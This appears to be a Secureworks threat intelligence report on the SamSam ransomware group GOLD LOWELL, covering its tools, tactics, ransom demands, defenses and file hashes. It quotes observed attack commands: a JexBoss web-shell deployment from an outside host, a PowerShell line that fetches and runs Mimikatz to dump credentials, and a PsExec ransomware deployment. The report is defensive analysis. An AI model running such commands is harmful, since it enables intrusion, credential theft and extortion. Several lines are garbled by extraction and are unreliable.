    "plain_text": "# SamSam Ransomware Campaigns\n\n**secureworks.com/research/samsam-ransomware-campaigns**\n\nSecureworks Counter Threat Unit\n\n## Summary\n\nIn late 2015, Secureworks® Counter Threat Unit™ (CTU) researchers began tracking financially motivated campaigns leveraging SamSam\nransomware (also known as Samas and SamsamCrypt). CTU™ researchers associate this activity with the GOLD LOWELL threat group.\nGOLD LOWELL typically scans for and exploits known vulnerabilities in Internet-facing systems to gain an initial foothold in a victim's network.\nThe threat actors then deploy the SamSam ransomware and demand payment to decrypt the victim's files. The consistent tools and behaviors\nassociated with SamSam intrusions since 2015 suggest that GOLD LOWELL is either a defined group or a collection of closely affiliated threat\nactors. Applying security updates in a timely manner and regularly monitoring for anomalous behaviors on Internet-facing systems are effective\ndefenses against these tactics. Organizations should also create and test response plans for ransomware incidents and use backup solutions\nthat are resilient to corruption or encryption attempts.\n\n[CTU™ researchers divided the threat intelligence about this threat group into two sections: strategic and](https://www.gartner.com/doc/2487216/definition-threat-intelligence) tactical. Executives can use the\nstrategic assessment of the ongoing threat to determine how to reduce risk to their organization's mission and critical assets. Computer\nnetwork defenders can use the tactical information gathered from incident response investigations and research to reduce the time and effort\nassociated with responding to the threat group's activities.\n\n## Key points\n\nCTU analysis of incidents involving the SamSam ransomware suggest that it is typically deployed after the threat actors exploit known\nvulnerabilities on perimeter systems to gain access to a victim's network.\nThese ransomware operations are opportunistic and have impacted organizations across a wide range of industry verticals.\n\n\n-----\n\ne t eat acto s dec s o to dep oy a so a e o o g a t a et o co p o se suggests t at t ey ocus o d dua\ncompromises rather than indiscriminately spreading ransomware via large-scale phishing or web exploit attacks.\nThese campaigns are very lucrative for the threat actors. For example, one GOLD LOWELL campaign conducted between late-2017 and\nearly-2018 generated at least $350,000 (USD) in revenue.\n\n## Strategic threat intelligence\n\nAnalysis of a threat group's targeting, origin, and competencies can determine which organizations could be at risk. This information can help\norganizations make strategic defensive decisions regarding this threat.\n\n### Intent\n\nData collected by Secureworks incident response (IR) analysts and analyzed by CTU researchers indicates that GOLD LOWELL extorts\nmoney from victims using the custom SamSam ransomware. The use of scan-and-exploit techniques to gain network access suggests that the\ngroup's campaigns target systems and protocols (e.g., JBoss and RDP) that are more likely to be used by organizations than by individuals.\nThe preference for leveraging access to vulnerable systems on a network perimeter suggests that the group targets organizations that are\nvulnerable to its methods, increasing the likelihood of successful extortion. In some cases where the victim paid the initial ransom, GOLD\nLOWELL revised the demand, significantly increasing the cost to decrypt the organization's files in an apparent attempt to capitalize on a\nvictim's willingness to pay a ransom.\n\nMost GOLD LOWELL victims known to CTU researchers are small to medium-size organizations. Some sources claimed that GOLD LOWELL\n[operations specifically targeted the healthcare vertical following public SamSam incidents in 2016 and](https://motherboard.vice.com/en_us/article/ezpzpe/the-spreading-epidemic-of-hospital-ransomware) [2018. However, Secureworks IR](https://www.bleepingcomputer.com/news/security/samsam-ransomware-hits-hospitals-city-councils-ics-firms/)\nanalysts' visibility of activity across various organizations indicates that GOLD LOWELL does not limit itself to specific industry verticals or\norganization types but just takes advantage of identified opportunities.\n\nThe group's practice of establishing network access prior to deploying SamSam poses a risk to data confidentiality on victims' systems.\nHowever, CTU analysis indicates that GOLD LOWELL is motivated by financial gain, and there is no evidence of the threat actors using\nnetwork access for espionage or data theft.\n\n### Capability\n\nGOLD LOWELL combines commodity and proprietary tools with publicly available exploits and techniques. The development of a custom\nransomware tool kit suggests that GOLD LOWELL's malware authors have a strong understanding of encryption and Windows network\nenvironments. The group demonstrates the ability to leverage access to Internet-facing systems, escalate privileges, and move laterally within\ncompromised networks. In contrast to other criminal ransomware activity, GOLD LOWELL operations require hands-on interactive keyboard\nactivity that establishes a direct relationship between the threat actors and the victim. The threat actors offer their victims test decryption\noptions prior to ransom payment to establish trust (see Figure 1).\n\n_Figure 1. Test decryption offer in GOLD LOWELL ransom note. (Source: Secureworks)_\n\nThere is evidence that GOLD LOWELL intrusions leverage third-party tools and services, such as access to compromised systems or\ncredentials. For example, Secureworks IR analysts observed the group using the xDedicRDPPatch tool to create new user accounts following\n[the initial compromise. This tool is available from the xDedic criminal marketplace, whose services include providing access to tools and](https://www.kaspersky.com/blog/xdedic/5648/)\ncompromised systems.\n\n### Attribution\n\nLinguistic errors in GOLD LOWELL's ransom notes and transaction communications suggest that the threat actors are probably not native\nEnglish speakers (see Figure 2).\n\n_Figure 2. GOLD LOWELL ransom note. (Source: Secureworks)_\n\nAs of this publication, there is uncertainty regarding the attribution of GOLD LOWELL due to the group's use of publicly available tools,\nservices, and infrastructure. The consistency of methods and tools used during SamSam intrusions since 2015 indicates that GOLD LOWELL\nis either a single group or a collection of closely affiliated threat actors.\n\n## Tactical threat intelligence\n\n\n-----\n\nSecu e o s a a ysts a e e cou te ed GO O act ty e est gat g u t p e et o t us o s, c p o des deta ed\ninsight into the threat group's tools and methods. The following tools, methods, and services are representative of GOLD LOWELL campaigns.\nHowever, some of the components are not unique to this group and may be used or supplied by other threat actors.\n\n### Tools\n\nCTU researchers have observed GOLD LOWELL using the following tools:\n\nSamSam — This custom ransomware .NET binary originally contained two embedded executables: del.exe or delfiletype.exe (SDelete\nSysinternals program) and selfdel.exe (used to delete its malicious activity) (see Figure 3). A variant from mid-2016 included a single\nSDelete binary hidden in the resource section and created a Windows batch script to perform some of the 'self-delete' functionality\n[previously provided by selfdel.exe. Samples from October 2017 that used the .stubbin extension included additional changes such as](http://blog.talosintelligence.com/2018/01/samsam-evolution-continues-netting-over.html)\nuse of a .NET loader to decrypt and execute the payload.\n\n_Figure 3. SamSam ransomware binary. (Source: Secureworks)_\n[JexBoss — In 2015 and 2016, GOLD LOWELL frequently exploited JBoss enterprise applications using several versions of this open-](https://github.com/joaomatosf/jexboss/)\nsource JBoss exploitation tool.\n[Mimikatz — This publicly available tool can steal user credentials from memory.](https://github.com/gentilkiwi/mimikatz)\n[reGeorg — A remote individual could use this SOCKS4/5 reverse proxy web shell to access other hosts on the network.](https://github.com/sensepost/reGeorg)\nHyena — This legitimate network administration tool includes a range of functionality for host enumeration and network profiling.\nSecureworks IR analysts discovered GOLD LOWELL downloading this tool onto compromised systems and using its network scanning\ncapability.\ncsvde.exe — This legitimate command-line tool can import and export data from Active Directory Domain Services (AD DS).\nNLBrute — This brute-force scanning tool identifies and abuses legitimate credentials for Internet-facing Remote Desktop Protocol (RDP)\nservices.\nxDedicRDPPatch — This post-exploitation RDP tool enables the creation of additional users. It is associated with the online xDedic\ncriminal marketplace, which is used for buying and selling malware and credentials for compromised systems.\n[Wmiexec — This publicly available tool executes commands via Windows Management Instrumentation (WMI).](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py)\n[RDPWrap — This freely available application can enable user accounts to be logged in locally and remotely at the same time.](https://github.com/stascorp/rdpwrap)\n\n### Tactics, techniques, and procedures\n\nBy analyzing multiple GOLD LOWELL ransomware campaigns, CTU researchers and Secureworks IR analysts have learned about the group's\ntactics and behaviors.\n\n**Exploitation and installation**\n\nBetween late-2015 and mid-2016, many GOLD LOWELL network intrusions leveraged JexBoss to initially compromise vulnerable Internetfacing JBoss systems. Analysis of JBoss version 6.1.0 application logs on one victim's network revealed an indicator of JexBoss activity:\n```\ndeploy, url=http:// www . joaomatosf . com/rnp/jbossass.war\n\n```\n\nThe tool allowed the threat actors to deploy web shells to run arbitrary commands on compromised systems (see Figure 4).\n\n_Figure 4. Example of a web shell (JBossass.jsp) deployed after the initial JexBoss exploitation. (Source: Secureworks)_\n\n\n-----\n\nJa ua y 0, GO O bega ta get g eg t ate accou t c ede t a s, so e cases d sco e g a d co p o s g accou ts\nusing brute-force techniques. Leveraging legitimate account credentials circumvents perimeter-based security controls, as long as the victim\ndoes not detect the high volume of unsuccessful brute-force attempts. In one incident, threat actors generated 500,000 failed authentication\nattempts on a local administrator account prior to compromise. Secureworks IR analysts observed brute force attempts targeting\n'administrator,' 'user1,' and 'scans' accounts, suggesting that the group focuses on a list of commonly used account names. During another\nintrusion, GOLD LOWELL imported the NLBrute tool (see Figure 5) into the victim's environment.\n\n_Figure 5. Screenshots of the NLBrute RDP brute-force tool. (Source: Secureworks)_\n\nFollowing an initial exploitation, GOLD LOWELL sometimes transfers tools to the compromised system. During a compromise in early 2018,\nSecureworks IR analysts observed the threat actors downloading files associated with PsExec, Wmiexec, and RDPWrap onto a compromised\nsystem.\n\n**Credential theft and account access**\n\nGOLD LOWELL follows a standard privilege escalation model, first gaining local administrator access. The threat actors leverage the Mimikatz\ntool to extract credentials from memory and use them to log into legitimate user accounts with the goal of accessing domain administrator\naccounts. During multiple engagements in 2016, Secureworks IR analysts observed GOLD LOWELL creating a 'JBoss' user account, which\nwas typically a local administrator account on the compromised JBoss system. In 2017 and early 2018, the group used PowerShell commands\nto call Mimikatz from an online PowerSploit repository, which is a collection of publicly available PowerShell modules for penetration testing:\n```\npowershell.exe iex (New-Object\nNet.WebClient).DownloadString('https://raw.githubusercontent[.]com/mattifestation/PowerSploit/master/Exfiltration/Invoke\nMimikatz.ps1');Invoke-Mimikatz –DumpCreds\n\n```\n**Discovery**\n\nAfter escalating privileges, the threat actors have performed reconnaissance of the compromised network infrastructure using custom scripts\nor SystemTools' Hyena tool. Hyena can enumerate details of other connected systems in the network (see Figure 6). The threat actors can\nthen use collected account credentials to gather additional information from those systems, including installed software, configuration settings,\nand users.\n\n_Figure 6. Hyena network administration tool. (Source: SystemTools)_\n\nGOLD LOWELL uses custom Visual Basic scripts (.vbs files) and batch files to automate rudimentary tasks. For example, Secureworks IR\nanalysts observed the threat actors using csvde.exe to collect hostnames from AD DS and then employing a custom batch file to parse the list\nand ping each system with a single packet using ICMP This process created a list of systems available to the attacker in a file named ok txt\n\n\n-----\n\nSa Sa equ es a u que S p ate ey to e c ypt data o eac ta geted syste e t eat acto s e t e ge e ate t e pub c/p ate ey\npair on an external system, or they download software to the compromised network to generate the key pair directly on the network and then\ncopy and remove the private key. At this stage, GOLD LOWELL typically downloads a compiled copy of the ransomware from a staging server.\n\n**Defensive evasion**\n\nDuring one 2017 incident, GOLD LOWELL's attempt to execute Mimikatz within the victim's environment was quarantined by the organization's\nendpoint protection tool. The threat actor responded by modifying a registry entry to disable the endpoint tool's scanning functionality. This\nchange allowed the threat actor to execute Mimikatz and collect credentials for 24 user accounts, including some accounts with elevated\nprivileges, in a file named m64.log.\n\n**Actions on objectives**\n\n[Secureworks IR analysts observed GOLD LOWELL using batch files, the PsExec or Wmiexec remote process execution tools, and Remote](https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx)\nDesktop Client to deploy and execute SamSam. In one incident, the threat actors used a rudimentary batch script to deploy the SamSam\npayload (character2.exe) via PsExec. The command suggests that the tool accepts a public key as a parameter, which could be an attempt to\navoid security controls that detect public key transfers from remote command and control (C2) servers.\n```\nps -accepteula -s \\<hostname> cmd.exe /c if exist C:\\windows\\system32\\character2.exe start /b character2.exe\n<hostname>_PublicKey.keyxml\n\n```\nSecureworks IR investigations in early 2018 revealed the threat actors using SMB to connect to systems immediately prior to the ransomware\ndeployment. This activity suggests that SMB may have been used by the group to copy the public keys, propagate the malware to available\nhosts, and execute the malware.\n\nThe ransomware targets files matching a hard-coded list of approximately 300 file extensions (see Figure 7). Before starting the encryption\nprocess, it categorizes files by size (less than 250MB, 500MB, 1000MB, and larger than 1000MB) and encrypts the smallest files first. The\nmalware also attempts to unlock files that are in use, presumably to ensure that active documents are encrypted and cause maximum impact\nto the victim.\n\n_Figure 7. Examples of hard-coded targeted file extensions. (Source: Secureworks)_\n\nFiles are encrypted using the Windows Cryptography API, with a symmetric-encryption algorithm (Rijndael) key that is randomly generated on\nthe compromised system. The ransomware then encrypts the Rijndael key with an RSA-2048 public key, providing adequate protection from\nincident responders' recovery efforts. After encrypting files of interest, the ransomware launches the Windows SDelete program to wipe the\nfree space on the disk to hinder recovery efforts. The malware also deletes the main ransomware binary and the free space wiper. It then\ndeploys another binary to delete all backup files from the local system and any network-accessible drives. When the encryption is complete,\nthe ransomware displays an HTML extortion message on the victim's system that demands a Bitcoin amount for each affected system or a\nlarger amount for all affected systems (see Figure 8). The message also specifies a seven-day deadline for payment.\n\n\n-----\n\n_Figure 8. GOLD LOWELL ransom note used in 2015-2016. (Source: Secureworks)_\n\nThe Bitcoin amounts increased in 2017, from 1.5 bitcoins per system in January 2016 to 1.7 bitcoins in June 2017 (see Figure 9). This change\nappears modest, but the increase in Bitcoin value amounts to a significant gap: 1.5 bitcoins in January 2016 was worth approximately $650,\nwhereas 1.7 bitcoins in June 2017 equated to $4,250. The cost to decrypt all affected systems also increased from 22 bitcoins (approximately\n$9,500) to 28 bitcoins (approximately $68,000). At the end of 2017, GOLD LOWELL appeared to adjust its ransom demands to account for the\nincrease in Bitcoin value, requesting 0.7 bitcoins (approximately $9,700) per system or 3 bitcoins (approximately $41,700) for all systems.\n\n_Figure 9. 2018 GOLD LOWELL ransom note. (Source: Secureworks)_\n\n[Third-party researchers discovered approximately $350,000 in bitcoins in one account in 2016 and a similar value in another wallet in 2018](https://community.rsa.com/community/products/netwitness/blog/2016/04/18/held-for-ransom-a-case-study-of-a-recent-ransomware-attack)\n(see Figure 10). These amounts illustrate the potential level of revenue generated by the group's activities and likely represent a subset of the\ngroup's total revenue.\n\n\n-----\n\n_Figure 10. Transaction into GOLD LOWELL Bitcoin wallet. (Source: BitRef.com)_\n\nGOLD LOWELL has used WordPress websites to coordinate ransomware payments with victims (see Figure 11). The victim must post a\ncomment with the compromised computer's details and a Bitcoin transaction reference. The threat actors then provide a download link to a\nunique XML executable file and corresponding RSA private key to decrypt the files.\n\n\n-----\n\n_Figure 11. GOLD LOWELL communicates with victims via WordPress blog comments. (Source: Secureworks)_\n\nIn a likely attempt to evade law enforcement attention, the group has also coordinated ransom payments via websites only accessible from the\nTor network (see Figure 12).\n\n_Figure 12. GOLD LOWELL Tor ransom payment site. (Source: https://www.alienvault.com/blogs/labs-research/samsam-ransomware-targeted-_\n_attacks-continue)_\n\n## Conclusion\n\nThe increase in GOLD LOWELL activity between 2015 and 2018 suggests that the group is profiting from delivering ransomware following\nopportunistic network compromises. The group slightly modified its methods, leveraged publicly available tools, and gradually evolved its\nproprietary payload to maintain success. The threat actors seek vulnerable systems to exploit, so CTU researchers encourage clients to\nprioritize security controls for Internet-facing systems and services. Best practices include prioritizing software updates, conducting regular\npenetration testing, monitoring for anomalous behaviors, and restricting access. Organizations should also evaluate their resilience to\nransomware incidents, which includes creating and testing incident response plans and generating and protecting regular backups of missioncritical data.\n\n## Threat indicators\n\nThe threat indicators in Table 1 are associated with GOLD LOWELL activity.\n\n**Indicator** **Type** **Context**\n\nNlbrute.exe Filename RDP brute-force tool used by GOLD LOWELL\n(observed in 2017)\n\n\n025c1c35c3198e6e3497d5dbf97ae81f MD5\nhash\n\n6d390038003c298c7ab8f2cbe35a50b07e096554 SHA1\nhash\n\n\nRDP brute-force tool (NLbrute.exe) used by\nGOLD LOWELL (observed in 2017)\n\nRDP brute-force tool (NLbrute.exe) used by\nGOLD LOWELL (observed in 2017)\n\n\n-----\n\n**Indicator** **Type** **Context**\n\n\nffa28db79daca3b93a283ce2a6ff24791956a768cb5fc791c075b638416b51f4 SHA256\nhash\n\n7e50f6e752b1335cbb4afe5aee93e317 MD5\nhash\n\nf69a4f9407f0aebf25576a4c9baa609cb35683d1 SHA1\nhash\n\n022f80d65608a6af3eb500f4b60674d2c59b11322a3f87dcbb8582ce34c39b99 SHA256\nhash\n\n\nRDP brute-force tool (NLbrute.exe) used by\nGOLD LOWELL (observed in 2017)\n\nRDPWrap tool used by GOLD LOWELL\n(observed in 2018)\n\nRDPWrap tool used by GOLD LOWELL\n(observed in 2018)\n\nRDPWrap tool used by GOLD LOWELL\n(observed in 2018)\n\n\nr45.exe Filename Filename of SamSam sample (observed in\nJanuary 2018)\n\n\n58b39bb94660958b6180588109c34f51 MD5\nhash\n\n7d21c1fb16f819c7a15e7a3343efb65f7ad76d85 SHA1\nhash\n\n88e344977bf6451e15fe202d65471a5f75d22370050fe6ba4dfa2c2d0fae7828 SHA256\nhash\n\n_Table 1.
